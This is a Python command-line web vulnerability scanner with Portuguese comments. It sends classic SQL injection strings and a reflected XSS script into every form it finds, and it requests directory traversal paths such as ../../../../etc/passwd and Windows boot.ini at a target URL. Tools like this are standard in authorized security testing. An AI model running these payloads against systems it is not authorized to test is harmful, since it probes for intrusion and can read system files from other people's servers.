#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# Paleta de cores para o terminal
class Cores:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# --- Funções de Verificação de Vulnerabilidades ---

def verificar_sql_injection(session, url, form_details):
    """
    Tenta explorar uma vulnerabilidade de SQL Injection em um formulário web.
    """
    vulnerabilidades_encontradas = []
    # Payloads clássicos de SQL Injection
    payloads = ["' OR '1'='1", "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1/*", "') OR ('1'='1"]

    action = form_details["action"]
    method = form_details["method"]
    inputs = form_details["inputs"]
    target_url = urljoin(url, action)

    for payload in payloads:
        data = {}
        for input_tag in inputs:
            if input_tag["type"] == "text" or input_tag["type"] == "password":
                data[input_tag["name"]] = payload
            elif input_tag["type"] != "submit":
                data[input_tag["name"]] = input_tag.get("value", "")

        try:
            if method.lower() == "post":
                res = session.post(target_url, data=data, timeout=5)
            else: # GET
                res = session.get(target_url, params=data, timeout=5)

            # Critérios de detecção (podem precisar de ajuste)
            if "sql syntax" in res.text.lower() or "mysql" in res.text.lower() or "you have an error in your sql syntax" in res.text.lower():
                resultado = f"[{Cores.FAIL}ALTO{Cores.ENDC}] Possível SQL Injection encontrado em {target_url} com o payload: {payload}"
                if resultado not in vulnerabilidades_encontradas:
                    vulnerabilidades_encontradas.append(resultado)
                    print(resultado)

        except requests.exceptions.RequestException as e:
            # Ignora erros de conexão para não poluir a saída
            pass
    return vulnerabilidades_encontradas

def verificar_xss(session, url, form_details):
    """
    Tenta explorar uma vulnerabilidade de Cross-Site Scripting (XSS) refletido.
    """
    vulnerabilidades_encontradas = []
    # Payload de XSS
    payload = "<script>alert('xss')</script>"

    action = form_details["action"]
    method = form_details["method"]
    inputs = form_details["inputs"]
    target_url = urljoin(url, action)

    data = {}
    for input_tag in inputs:
        if input_tag["type"] == "text":
            data[input_tag["name"]] = payload
        elif input_tag["type"] != "submit":
            data[input_tag["name"]] = input_tag.get("value", "")

    try:
        if method.lower() == "post":
            res = session.post(target_url, data=data, timeout=5)
        else:
            res = session.get(target_url, params=data, timeout=5)

        if payload in res.text:
            resultado = f"[{Cores.WARNING}MÉDIO{Cores.ENDC}] Possível XSS Refletido encontrado em {target_url} no formulário com action '{action}'"
            if resultado not in vulnerabilidades_encontradas:
                vulnerabilidades_encontradas.append(resultado)
                print(resultado)

    except requests.exceptions.RequestException as e:
        pass
    return vulnerabilidades_encontradas

def verificar_directory_traversal(session, url):
    """
    Tenta acessar arquivos sensíveis usando Directory Traversal.
    """
    vulnerabilidades_encontradas = []
    # Payloads comuns para Directory Traversal
    payloads = [
        "../../../../etc/passwd",
        "../../../../boot.ini",
        "../../../../Windows/win.ini"
    ]
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

    for payload in payloads:
        test_url = urljoin(base_url, payload)
        try:
            res = session.get(test_url, timeout=5)
            # Verifica se a resposta contém indicadores de sucesso
            if ("root:" in res.text and "/bin/bash" in res.text) or ("[boot loader]" in res.text) or ("for 16-bit app support" in res.text):
                 resultado = f"[{Cores.FAIL}ALTO{Cores.ENDC}] Possível Directory Traversal encontrado em: {test_url}"
                 if resultado not in vulnerabilidades_encontradas:
                    vulnerabilidades_encontradas.append(resultado)
                    print(resultado)
        except requests.exceptions.RequestException:
            pass
    return vulnerabilidades_encontradas


# --- Funções Auxiliares ---

def get_all_forms(session, url):
    """
    Extrai todos os formulários de uma página web.
    """
    try:
        response = session.get(url, timeout=5)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except (requests.exceptions.RequestException, ValueError) as e:
        print(f"{Cores.FAIL}Erro ao acessar {url}: {e}{Cores.ENDC}")
        return []


def get_form_details(form):
    """
    Extrai informações detalhadas de um formulário.
    """
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

# --- Função Principal de Scan ---

def scan_url(url, max_threads=10):
    """
    Coordena a varredura em uma URL específica.
    """
    print(f"\n{Cores.OKBLUE}[*] Iniciando varredura em: {url}{Cores.ENDC}")

    with requests.Session() as session:
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })

        # 1. Verificar Directory Traversal na URL base
        verificar_directory_traversal(session, url)

        # 2. Extrair e verificar formulários para SQLi e XSS
        forms = get_all_forms(session, url)
        if not forms:
            print(f"{Cores.OKGREEN}[-] Nenhum formulário encontrado em {url}.{Cores.ENDC}")
            return

        print(f"{Cores.OKBLUE}[*] Encontrados {len(forms)} formulários em {url}. Testando...{Cores.ENDC}")

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            future_to_form = {}
            for form in forms:
                form_details = get_form_details(form)
                # Envia tarefas para o pool de threads
                future_to_form[executor.submit(verificar_sql_injection, session, url, form_details)] = form_details
                future_to_form[executor.submit(verificar_xss, session, url, form_details)] = form_details

            # Coleta os resultados conforme são concluídos
            for future in as_completed(future_to_form):
                try:
                    future.result()
                except Exception as exc:
                    print(f'{Cores.FAIL}Uma tarefa gerou uma exceção: {exc}{Cores.ENDC}')


# --- Ponto de Entrada do Script ---

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Scanner de Vulnerabilidades Web Básico.")
    parser.add_argument("url", help="A URL da aplicação web para escanear.")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Número de threads para usar (padrão: 10).")

    # Verifica se algum argumento foi passado
    if len(sys.argv) == 1:
        # Imprime o banner
        print(f"""{Cores.HEADER}
███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗
██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
        {Cores.BOLD}Ferramenta de Análise de Segurança Web{Cores.ENDC}
        """)
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    # Validação da URL
    if not urlparse(args.url).scheme:
        print(f"{Cores.FAIL}Erro: URL inválida. Por favor, inclua o esquema (http:// ou https://).{Cores.ENDC}")
        sys.exit(1)

    scan_url(args.url, args.threads)
    print(f"\n{Cores.OKGREEN}[+] Varredura concluída.{Cores.ENDC}")
